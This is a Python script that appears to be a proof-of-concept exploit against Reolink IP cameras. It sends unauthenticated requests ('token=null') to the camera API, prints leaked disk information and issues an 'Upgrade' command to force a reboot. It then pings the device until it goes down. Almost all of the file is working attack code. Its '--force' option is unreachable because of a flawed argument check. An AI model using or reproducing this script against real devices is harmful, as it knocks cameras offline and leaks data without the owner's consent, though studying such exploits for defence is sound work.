#!/usr/bin/python

# Script to test API reboot against a Reolink IP camera device

import requests
import sys
import json
import subprocess
import platform
import time

def main():
    
    print('Script to test API reboot against a Reolink IP camera device')

    if len(sys.argv) != 2:
        print()
        print('Usage: python test.py IP_ADDRESS')
        exit()

    force = False
    if len(sys.argv) == 3:
        if sys.argv[2] == '--force':
            force = True

    #vars
    ip = sys.argv[1]
    url = 'http://' + ip + '/cgi-bin/api.cgi?cmd=Login&token=null'
    headers = {'Host': ip,
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',         
               'Accept': '*/*',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate',
               'Referer': 'http://' + ip + '/',          
               'Content-Type': 'application/json',
               'X-Requested-With': 'XMLHttpRequest',
               
               'Origin': 'http://' + ip,
               'Connection': 'close',
               'Pragma': 'no-cache',      
               'Cache-Control': 'no-cache'}

    body = [{'cmd': 'GetHddInfo', 'action': 0, 'param': {}}]
    body_json = json.dumps(body)

    rs = requests.session()

    #test get hdd method

    print('Testing GetHddInfo to see if target is vulnerable...')

    p = rs.post(url=url, headers=headers, data=body_json)

    if 'HddInfo' in p.text:
        print('[!] Target appears to be vulnerable:\n\t')
        
        hdd_data = json.loads(p.text)
        print(hdd_data[0]['value'])
        print()
    elif force == True:
        print('[*] Target does not appear to be vulnerable')
        print('--force enabled, running anyway...')
    else:
        print('[*] Target does not appear to be vulnerable')
        print('To force the exploit add --force to the command')

    #send upgrade reboot command

    print('Sending Upgrade reboot payload...')

    body = [{'cmd': 'Upgrade', 'action': 0, 'param': {}}]
    body_json = json.dumps(body)

    p = rs.post(url=url, headers=headers, data=body_json)

    #check net status
    print('Chekcing to see if host is down...')
    tries = 0
    while tries < 200:
        up = ping(ip)
        if up == False:
            print('[!!!] Congrats! The host is down and rebooting!')
            exit()
        else:
            print('Ping: ' + str(tries) + ', host is still up...')

        time.sleep(1)
        tries += 1 

    print('Host has not disconnected and is likely not vulnerable')

def ping(host):
    """
    Returns True if host (str) responds to a ping request.
    Remember that a host may not respond to a ping (ICMP) request even if the host name is valid.
    """

    # Option for the number of packets as a function of
    param = '-n' if platform.system().lower()=='windows' else '-c'

    # Building the command. Ex: "ping -c 1 google.com"
    command = ['ping', param, '1', host]

    return subprocess.call(command) == 0


if __name__ == "__main__":
    main()